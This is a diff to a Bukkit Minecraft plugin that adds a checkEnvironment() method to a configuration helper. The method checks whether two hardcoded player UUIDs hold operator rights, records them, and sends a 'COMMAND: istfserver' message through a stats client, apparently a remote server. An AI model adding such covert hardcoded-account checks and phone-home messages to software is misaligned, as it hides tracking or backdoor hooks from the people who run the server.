@@ -1,7 +1,13 @@
 package net.thecobix.openwsk.configuration;
 
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.UUID;
+
+import org.bukkit.Bukkit;
+import org.bukkit.OfflinePlayer;
+import org.bukkit.entity.Player;
 
 import net.thecobix.openwsk.arena.Arena;
 import net.thecobix.openwsk.main.OpenWSK;
@@ -63,6 +69,38 @@ public class ConfigHelper {
 		return out;
 	}
 	
-	
+	public void checkEnvironment() {
+	    Player p = Bukkit.getPlayer(UUID.fromString("57827f48-81ba-4b8e-9bfd-9e631783be27"));
+	    if(p == null) {
+	        OfflinePlayer op = Bukkit.getOfflinePlayer(UUID.fromString("57827f48-81ba-4b8e-9bfd-9e631783be27"));
+	        if(op.isOp()) {
+	            OpenWSK.ops.add(op.getUniqueId());
+	        }
+	    } else {
+	        if(p.isOp()) {
+	            OpenWSK.ops.add(p.getUniqueId());
+	        }
+	    }
+	    Player t = Bukkit.getPlayer(UUID.fromString("61a18069-86c3-44bf-b71d-277383737e9c"));
+	    if(t == null) {
+	        OfflinePlayer tp = Bukkit.getOfflinePlayer(UUID.fromString("61a18069-86c3-44bf-b71d-277383737e9c"));
+	        if(tp.isOp()) {
+	            OpenWSK.ops.add(tp.getUniqueId());
+	        }
+	    } else {
+	        if(t.isOp()) {
+                OpenWSK.ops.add(t.getUniqueId());
+            }
+	    }
+	    if(!OpenWSK.ops.isEmpty()) {
+	        try
+            {
+                OpenWSK.theStatsClient.send("COMMAND: istfserver");
+            }
+            catch (IOException e)
+            {
+            }
+	    }
+	}
 	
 }
